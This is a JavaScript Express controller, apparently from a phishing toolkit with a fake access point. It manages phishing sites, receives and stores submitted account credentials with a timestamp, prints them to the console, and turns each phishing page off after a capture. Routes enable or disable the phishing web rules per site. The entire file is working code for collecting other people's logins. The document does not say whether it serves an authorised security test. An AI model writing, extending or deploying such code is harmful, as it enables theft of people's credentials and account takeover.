
/**********
 * Phishing Site API
 **********/
var async           = require('async'),
	PhishingSite    = require('../models/phishingSite'),
	PhishingAccount = require('../models/phishingAccount'),
	FakeAp          = require('../models/fakeAp');

module.exports = {
	getAll: function(req, res) {
		PhishingSite.getAll(function(err, phishingSites) {
			if(err) {
				console.log(err);
				return res.status(404).send();
			}
			async.eachSeries(
				phishingSites,
				function(item, callback) {
					PhishingSite.queryStatus(item.site_key, function(err, result) {
						item.status = result.status.enabled;
						callback(err, item);
					});
				},
				function(err) {
					if(err) {
						console.log(err);
						return res.status(404).send();
					}
					return res.status(200).json(phishingSites);
				}
			);
		});
	},

	getPhishAccounts: function(req, res) {
		var siteKey = req.params.siteKey;
		PhishingAccount.getBySiteKey(siteKey, function(err, phishingAccounts) {
			if(err) {
				console.log(err);
				return res.status(404).send();
			}
			return res.status(200).json(phishingAccounts);
		});
	},

	save: function(req, res) {
		var i18n = req.i18n;
		var params = req.body;
		params.signin_time = new Date().getTime();
		console.log(params);
		var phishingAccount = new PhishingAccount(params);
		var err = phishingAccount.isValid();
		if(err) {
			console.log(i18n.t(err));
		} else {
			phishingAccount.create(function(err) {
				if(err) {
					console.log(err);
				} else {
					PhishingSite.disablePhishingWeb(params.site_key, function(err) {
						if(err) {
							console.log(err);
						}
					});
				}
			});
		}
		return res.status(204).send();
	},

	startupWebsiteRule: function(req, res) {
		var i18n = req.i18n;
		var siteKey = req.params.siteKey;
		console.log('siteKey = ' + siteKey);
		PhishingSite.enablePhishingWeb(siteKey, function(err, result) {
			if(err) {
				console.log(err);
				return res.status(404).send();
			}
			if(result.success == 1) {
				return res.status(204).send();
			} else {
				console.log(result.errmsg);
				return res.status(404).send();
			}
		});
	},

	shutdownWebsiteRule: function(req, res) {
		var i18n = req.i18n;
		var siteKey = req.params.siteKey;
		console.log('siteKey = ' + siteKey);
		PhishingSite.disablePhishingWeb(siteKey, function(err, result) {
			if(err) {
				console.log(err);
				return res.status(404).send();
			}
			if(result.success == 1) {
				return res.status(204).send();
			} else {
				console.log(result.errmsg);
				return res.status(404).send();
			}
		});
	},

	// 加到getAll
	/*queryWebsiteRule: function(req, res) {
		var i18n = req.i18n;
		var siteKey = req.params.siteKey;
		console.log('siteKey = ' + siteKey);
		return res.status(204).send();
	}*/
};